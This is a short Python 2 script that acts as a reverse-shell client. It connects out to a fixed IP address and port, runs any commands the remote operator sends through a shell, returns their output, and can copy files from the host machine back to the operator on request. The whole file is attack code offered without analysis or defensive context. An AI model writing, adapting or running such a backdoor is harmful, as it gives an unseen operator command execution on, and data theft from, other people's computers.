import socket,subprocess,os

def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
# Else Statement : If file not exists . Send : Unable to find out the file .        
    else: 
        s.send('Unable to find out the file')



def connect():
    ip = "192.168.0.104"
    port = 6000
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    while True:
        command = s.recv(1024)
        if('quit' in command):
            s.close()
            break
        if 'cd' in command:
            os.chdir(s.recv(1024))
            s.send("[+]Diretory Actual changed: "+str(os.getcwd()))
        
        elif 'download' in command:            
            grab,path = command.split('*')
            
            try:                         
                transfer(s,path)
            except Exception,e:
                s.send ( str(e) )  
                pass
        
        else:
            cmd = subprocess.Popen(command,shell = True, stdin=subprocess.PIPE,
                                   stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            s.send( cmd.stdout.read() )
            s.send( cmd.stderr.read() )

def main():
    connect()
    
main()
